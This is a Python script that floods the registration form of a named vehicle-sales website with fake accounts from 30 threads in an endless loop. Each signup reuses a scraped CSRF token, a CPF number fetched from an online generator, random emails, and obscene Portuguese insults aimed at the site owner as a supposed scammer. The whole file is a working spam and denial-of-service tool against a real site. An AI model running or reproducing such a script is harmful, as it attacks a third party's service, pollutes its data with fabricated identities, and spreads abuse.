import requests
from bs4 import BeautifulSoup
import requests
  
# sample web page


import random
import threading

def do_request():
    while True:
        with requests.Session() as s:
            url = 'https://www.alffaveiculos.com/br/cadastro'
            page = s.get(url)
            url2 ='https://www.4devs.com.br/ferramentas_online.php'
            soup = BeautifulSoup(page.content, "html.parser")
            apikey = soup.find("meta",{"name":"csrf-token"})['content']

            data_gerador ={
                'acao': 'gerar_cpf',
            'pontuacao': 'S',
            'cpf_estado': 'RJ'
            }


            cpf_gerador = requests.post(url2, data=data_gerador).text
            print(cpf_gerador)

            data = {
            '_token':apikey,
            'tipo':'fisica',
            'cpf': cpf_gerador,
            'rg': '21222222',
            'nome_completo': "me contate por  ",
            'sexo':'m',
            'nascimento':'24/12/01',
            'apelido':'como cu de golpista',
            'telefone': '(22) 2222-2222',
            'celular':'(22) 2222-2222',
            'cep': '22.222-222',
            'endereco':'rua do comedor de cu de corno',
            'numero':34,
            'complemento': 2222,
            'bairro': 2222,
            'cidade': 'maceto cu do dono',
            'email': str(random.randint(0,99999999)) +'@mail.com',
            'password':123456,
            'password_confirmation':123456
            
            }
            try:
                response = s.post(url,data=data).text
                print(response)
            except ConnectionError:
                print('erro, tentando novamente')
            
threads =[]

for i in range(30):
    t = threading.Thread(target=do_request)
    t.daemon= True
    threads.append(t)

for i in range(30):
    threads[i].start()

for i in range(30):
    threads[i].join()